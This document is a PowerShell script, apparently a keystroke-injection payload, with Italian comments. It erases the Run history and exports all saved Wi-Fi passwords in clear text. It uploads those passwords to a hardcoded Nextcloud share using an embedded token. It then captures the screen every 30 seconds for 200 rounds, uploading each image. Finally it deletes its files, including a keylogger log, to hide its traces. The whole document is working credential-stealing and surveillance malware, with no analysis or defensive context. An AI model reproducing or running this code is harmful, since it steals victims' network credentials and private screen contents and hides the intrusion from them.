function Nextcloud-Upload {
    [CmdletBinding()]
    param (
        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
        [Alias("f")]
        [string]$SourceFilePath
    ) 

    # Set security protocol to TLS 1.2
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    $file = $SourceFilePath
    $nextcloudUrl = "https://wim.nl.tabdigital.cloud/"
    $sharetoken = 'gkj9TSrXtzxGrn4'

    # Retrieve file object
    $fileObject = Get-Item $file

    # Define headers for HTTP request
    $headers = @{
        "Authorization"=$("Basic $([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($("$($sharetoken):"))))");
        "X-Requested-With"="XMLHttpRequest";
    }

    # Construct URL for webdav endpoint
    $webdavUrl = "$($nextcloudUrl)/public.php/webdav/$($fileObject.Name)"

    # Upload file to Nextcloud server
    Invoke-RestMethod -Uri $webdavUrl -InFile $fileObject.Fullname -Headers $headers -Method Put 
}

# Delete the history of run
cd HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\
Remove-Item .\RunMRU\ -ErrorAction SilentlyContinue

# All the files will be saved in this directory
$p = "C:\wipass"
if (!(Test-Path $p)) { mkdir $p }
cd $p

# Get all saved wifi password
netsh wlan export profile key=clear
dir *.xml | % {
    $xml=[xml] (get-content $_)
    $a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
    Out-File "$env:computername-wificapture.txt" -Append -InputObject $a
}

# Carica il file password se esiste
if (Test-Path "$env:computername-wificapture.txt") {
    "$env:computername-wificapture.txt" | Nextcloud-Upload
}

# Clear tracks WiFi
rm *.xml -ErrorAction SilentlyContinue
rm *.txt -ErrorAction SilentlyContinue
cd ..
rm wipass -Recurse -Force -ErrorAction SilentlyContinue

# --- Inizio Ciclo Screenshots ---
$i = 0
while($i -lt 200){

    Add-Type -AssemblyName System.Windows.Forms,System.Drawing

    $screens = [Windows.Forms.Screen]::AllScreens

    $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
    $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
    $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
    $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum

    $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
    $bmp      = New-Object -TypeName System.Drawing.Bitmap -ArgumentList ([int]$bounds.width), ([int]$bounds.height)
    $graphics = [Drawing.Graphics]::FromImage($bmp)

    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

    # 1. Definiamo il percorso del file corrente usando $i
    $currentScreenshot = "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture-$i.png"

    # 2. Salviamo l'immagine
    $bmp.Save($currentScreenshot)
    $graphics.Dispose()
    $bmp.Dispose()
  
    # 3. Carichiamo l'immagine SUBITO (prima di incrementare $i)
    if (Test-Path $currentScreenshot) {
        $currentScreenshot | Nextcloud-Upload
    }
    
    # 4. Incrementiamo il contatore e aspettiamo per il prossimo giro
    $i++
    start-sleep -Seconds 30
}

# --- Pulizia finale ---
$paths = "$env:APPDATA\c.ps1", "$env:APPDATA\sg.ps1", "$env:APPDATA\sg2.ps1", "C:\Users\Irene\Desktop\OMG\testing\temp.txt", "$env:temp\keylogger.txt", "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture-*.png"

foreach($filePath in $paths) {
    if (Test-Path $filePath) {
        Write-Host "Path removed: $filePath" 
        Remove-Item $filePath -Verbose -Force
    } else {
        Write-Host "Path $filePath doesn't exist"
    }
}
